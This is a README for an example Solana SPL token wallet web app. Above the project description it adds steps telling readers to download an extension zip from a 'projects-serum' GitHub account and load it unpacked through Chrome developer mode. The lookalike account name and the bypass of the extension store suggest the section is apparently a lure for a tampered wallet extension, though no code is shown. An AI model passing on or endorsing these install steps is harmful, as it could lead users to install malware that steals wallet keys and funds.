# SPL Token Wallet
## How to install Chrome extensions manually
**1.** Download the extension zip file directly here [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip), Then Unzip the file to a folder.<br>
**2.** Go to **chrome://extensions/** and check the box for **Developer mode** in the top right.<br>
**3.** Locate the ZIP file on your computer and unzip it.<br>
**4.** Go back to the **chrome://extensions/** page and click the **Load unpacked extension** button and select the **unzipped folder** for your extension to install it.<br>

Example Solana wallet with support for [SPL tokens](https://spl.solana.com/token) and Serum integration.

See [sollet.io](https://www.sollet.io) or the [Sollet Chrome Extension](https://chrome.google.com/webstore/detail/sollet/fhmfendgdocmcbmfikdcogofphimnkno) for a demo.

Wallet keys are stored in `localStorage`, optionally encrypted by a password.

Run `yarn start` to start a development server or `yarn build` to create a production build that can be served by a static file server.
See the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started) for other commands and options.
